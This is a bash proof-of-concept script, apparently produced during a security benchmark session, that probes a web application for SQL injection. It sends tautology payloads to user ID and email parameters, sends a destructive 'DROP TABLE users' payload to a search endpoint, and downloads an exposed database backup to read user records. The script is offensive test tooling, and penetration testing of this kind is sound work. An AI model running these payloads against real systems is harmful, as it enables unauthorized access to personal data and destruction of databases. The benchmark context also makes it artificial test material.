#!/bin/bash
# POC: Demonstrates SQL injection vulnerability in application endpoints that query the manapool.db database with unsanitized user input
# Target: ./repo
# Created: 2025-11-07T16:14:02.469Z
# Session: benchmark-XBEN-084-24-mhp1efma

# SQL Injection POC - Testing application endpoints for SQL injection vulnerabilities
# Target: Application endpoints that query manapool.db with user input

TARGET_URL="${1:-http://localhost:3000}"

echo "[*] SQL Injection POC - Testing application database queries"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: UID parameter SQL injection
echo "[TEST 1] Testing UID parameter for SQL injection"
echo "---"
PAYLOAD_1="1' OR '1'='1"
ENCODED_1=$(echo -n "$PAYLOAD_1" | jq -sRr @uri)
echo "Payload: $PAYLOAD_1"
echo "Testing endpoint: GET /user?uid=$ENCODED_1"

RESPONSE_1=$(curl -s -w "\n%{http_code}" "$TARGET_URL/user?uid=$ENCODED_1" 2>&1)
HTTP_CODE_1=$(echo "$RESPONSE_1" | tail -n1)
BODY_1=$(echo "$RESPONSE_1" | head -n-1)

echo "HTTP Status: $HTTP_CODE_1"
echo "Response snippet: $(echo "$BODY_1" | head -c 200)"
echo ""

# Test 2: Email parameter SQL injection
echo "[TEST 2] Testing email parameter for SQL injection"
echo "---"
PAYLOAD_2="admin' OR '1'='1"
ENCODED_2=$(echo -n "$PAYLOAD_2" | jq -sRr @uri)
echo "Payload: $PAYLOAD_2"
echo "Testing endpoint: GET /user?email=$ENCODED_2"

RESPONSE_2=$(curl -s -w "\n%{http_code}" "$TARGET_URL/user?email=$ENCODED_2" 2>&1)
HTTP_CODE_2=$(echo "$RESPONSE_2" | tail -n1)
BODY_2=$(echo "$RESPONSE_2" | head -n-1)

echo "HTTP Status: $HTTP_CODE_2"
echo "Response snippet: $(echo "$BODY_2" | head -c 200)"
echo ""

# Test 3: Search/name parameter SQL injection
echo "[TEST 3] Testing name/search parameter for SQL injection"
echo "---"
PAYLOAD_3="'; DROP TABLE users; --"
ENCODED_3=$(echo -n "$PAYLOAD_3" | jq -sRr @uri)
echo "Payload: $PAYLOAD_3"
echo "Testing endpoint: GET /search?name=$ENCODED_3"

RESPONSE_3=$(curl -s -w "\n%{http_code}" "$TARGET_URL/search?name=$ENCODED_3" 2>&1)
HTTP_CODE_3=$(echo "$RESPONSE_3" | tail -n1)
BODY_3=$(echo "$RESPONSE_3" | head -n-1)

echo "HTTP Status: $HTTP_CODE_3"
echo "Response snippet: $(echo "$BODY_3" | head -c 200)"
echo ""

# Test 4: Direct database access to verify schema
echo "[TEST 4] Verifying database accessibility and schema"
echo "---"
DB_FILE="manapool.db"
echo "Attempting to download database file..."
curl -s -o /tmp/test_$DB_FILE "$TARGET_URL/s3/backups/manapool.db" 2>&1

if [ -f "/tmp/test_$DB_FILE" ]; then
    echo "✓ Database file downloaded successfully"
    FILE_TYPE=$(file "/tmp/test_$DB_FILE" 2>&1)
    echo "File type: $FILE_TYPE"
    
    # Try to read schema
    echo "Database schema (if sqlite3 available):"
    if command -v sqlite3 &> /dev/null; then
        sqlite3 "/tmp/test_$DB_FILE" ".schema users" 2>/dev/null || echo "Could not query schema"
        echo ""
        echo "Sample users table data:"
        sqlite3 "/tmp/test_$DB_FILE" "SELECT uid, email, name FROM users LIMIT 3;" 2>/dev/null || echo "Could not query data"
    else
        echo "sqlite3 not available for schema inspection"
    fi
    echo ""
    rm -f "/tmp/test_$DB_FILE"
else
    echo "✗ Failed to download database file"
fi

echo ""
echo "[SUMMARY]"
echo "If any endpoints respond with 200 or 500 status (not 404), the endpoint may exist."
echo "SQL injection indicators:"
echo "  - Different behavior with OR '1'='1 payload vs normal input"
echo "  - Error messages revealing database structure"
echo "  - Multiple records returned from single-record query"
echo "  - Database exceptions or SQL errors in response"